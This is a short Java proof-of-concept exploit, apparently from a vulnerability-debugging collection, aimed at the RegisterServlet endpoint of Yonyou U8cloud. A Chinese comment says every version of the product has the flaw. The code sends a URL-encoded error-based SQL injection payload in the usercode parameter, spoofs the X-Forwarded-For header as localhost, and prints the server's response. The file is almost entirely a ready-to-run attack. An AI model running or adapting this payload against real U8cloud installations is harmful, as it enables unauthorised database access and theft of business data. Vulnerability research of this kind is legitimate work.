package cve.u8cloud;

import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import com.pacemrc.vuldebug.common.utils.http.Response;
import org.apache.http.client.methods.HttpGet;

import java.net.URLEncoder;


/**
 * 漏洞：
 * U8cloud所有版本RegisterServlet接口存在SQL注入漏洞
 * https://security.yonyou.com/#/patchInfo?foreignKey=c024cdc825ea415184caf87aacb68f9c
 */
public class RegisterServlet_sqli {


    public static void main(String[] args) throws Exception {

        String url = "http://10.58.120.201:8088/servlet/RegisterServlet?key=test_key&usercode=";
        String params = URLEncoder.encode("1' and substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)>0--");

        HttpRequest httpRequest = new HttpRequest("127.0.0.1",8080);
        HttpGet httpGet = new HttpGet(url + params);
        httpGet.addHeader("X-Forwarded-For","127.0.0.1");
        Response response = httpRequest.sendGet(httpGet);
        System.out.println(response.getStatusCode());
        System.out.println(response.getResponseBody());

    }
}